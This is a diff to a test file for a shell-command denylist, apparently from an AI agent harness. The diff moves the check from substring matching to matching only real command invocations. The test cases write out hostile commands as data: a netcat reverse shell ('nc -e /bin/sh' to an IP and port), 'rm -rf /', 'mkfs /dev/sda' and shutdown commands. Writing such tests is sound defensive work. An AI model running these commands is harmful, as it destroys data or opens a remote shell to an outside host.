@@ -69,15 +69,27 @@ describe('the denylist reads a command, not a mention of one', () => {
     expect(commandPolicyViolation('npm test --grep "chmod 777" /tmp')).toBeNull();
   });
 
-  it('still refuses a command whose RAW text contains a blocked entry', () => {
-    // Pre-existing behaviour, asserted so the argv anchoring above is not
-    // mistaken for a loosening. The raw-string scan is untouched, so a command
-    // that spells a blocked entry in its own text — `grep -r "rm -rf /" .`, or
-    // `find . -name mkfs.conf` — is refused now exactly as it was before this
-    // branch. Coarse, and left alone: tightening it is a separate change with
-    // its own risk, and widening what runs is not this commit's business.
-    expect(commandPolicyViolation('grep -r "rm -rf /" .')).toMatch(/Blocked command detected/);
-    expect(commandPolicyViolation('find . -name mkfs.conf')).toMatch(/Blocked command detected/);
+  it('no longer refuses a command that merely mentions a blocked entry', () => {
+    // The scan used to be a plain substring test, which refused any command
+    // whose text spelled an entry anywhere. Measured on the shipped list, that
+    // meant `nc ` blocked `npm run sync tests`, `go test ./internal/sync` and
+    // `cargo test --features async ui` — ordinary verification commands, all
+    // three. A scorer treats such a refusal as unfixable, so it would have
+    // failed correct children over a command that never ran.
+    expect(commandPolicyViolation('npm run sync tests')).toBeNull();
+    expect(commandPolicyViolation('go test ./internal/sync -run X')).toBeNull();
+    expect(commandPolicyViolation('cargo test --features async ui')).toBeNull();
+    expect(commandPolicyViolation('grep -r "rm -rf /" .')).toBeNull();
+    expect(commandPolicyViolation('find . -name mkfs.conf')).toBeNull();
+  });
+
+  it('still refuses the entry when it IS the command', () => {
+    // The loosening above must not reach a real invocation: at the start of the
+    // line, after a separator, or behind an environment-variable prefix.
+    expect(commandPolicyViolation('nc -e /bin/sh 10.0.0.1 4444')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('foo | nc host 1234')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('X=1 rm -rf /')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('LC_ALL=C DEBUG=1 mkfs /dev/sda')).toMatch(/Blocked command detected/);
   });
 
   it('still refuses the dequoted command itself', () => {
@@ -106,14 +118,12 @@ describe('the dequoted check reaches the sh -c path too', () => {
     expect(commandPolicyViolation('netcatalog list')).toBeNull();
   });
 
-  it('inherits the raw scan’s coarseness, and says so', () => {
-    // `haltcheck` and `shutdownctl` contain a bare denylist entry in their own
-    // text, so the untouched raw substring scan refuses them — as it did before
-    // this branch. Recorded rather than quietly fixed: loosening that rule is a
-    // separate change with its own risk, and this commit only owes the argv
-    // path it added.
-    expect(commandPolicyViolation('haltcheck --x y')).toMatch(/Blocked command detected/);
-    expect(commandPolicyViolation('shutdownctl --status')).toMatch(/Blocked command detected/);
+  it('does not refuse a longer command name that begins with an entry', () => {
+    expect(commandPolicyViolation('haltcheck --x y')).toBeNull();
+    expect(commandPolicyViolation('shutdownctl --status')).toBeNull();
+    // …while the real ones stay refused.
+    expect(commandPolicyViolation('halt')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('shutdown -h now')).toMatch(/Blocked command detected/);
   });
 
   it('still refuses the real command after a separator', () => {
